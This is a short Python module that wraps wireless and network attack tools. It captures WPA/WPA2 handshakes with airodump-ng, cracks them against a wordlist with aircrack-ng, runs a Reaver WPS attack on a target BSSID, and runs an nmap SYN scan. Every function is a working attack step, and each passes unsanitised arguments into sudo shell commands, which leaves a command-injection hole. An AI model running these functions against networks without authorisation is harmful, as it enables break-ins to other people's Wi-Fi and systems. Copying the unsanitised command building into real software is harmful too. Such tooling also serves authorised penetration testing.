from tools import run_command
import logging

logging.basicConfig(level=logging.INFO)

def capture_handshake(bssid, channel, interface):
    """Capture WPA/WPA2 handshake."""
    logging.info(f"Capturing handshake for BSSID {bssid} on channel {channel} using interface {interface}")
    try:
        result = run_command(f"sudo airodump-ng --bssid {bssid} --channel {channel} -w capture {interface}mon")
        logging.info(result)
        return result
    except Exception as e:
        logging.error(f"Error capturing handshake: {e}")
        return None

def crack_wpa_handshake(wordlist, bssid):
    """Crack WPA/WPA2 handshake using a wordlist."""
    logging.info(f"Cracking WPA/WPA2 handshake for BSSID {bssid} using wordlist {wordlist}")
    try:
        result = run_command(f"sudo aircrack-ng -w {wordlist} -b {bssid} capture-01.cap")
        logging.info(result)
        return result
    except Exception as e:
        logging.error(f"Error cracking handshake: {e}")
        return None

def wps_attack(bssid, interface):
    """Perform WPS attack on a target BSSID."""
    logging.info(f"Performing WPS attack on BSSID {bssid} using interface {interface}")
    try:
        result = run_command(f"sudo reaver -i {interface}mon -b {bssid} -vv")
        logging.info(result)
        return result
    except Exception as e:
        logging.error(f"Error performing WPS attack: {e}")
        return None

def port_scan(target_ip):
    """Perform a port scan on a target IP address."""
    logging.info(f"Performing port scan on target IP {target_ip}")
    try:
        result = run_command(f"sudo nmap -sS {target_ip}")
        logging.info(result)
        return result
    except Exception as e:
        logging.error(f"Error performing port scan: {e}")
        return None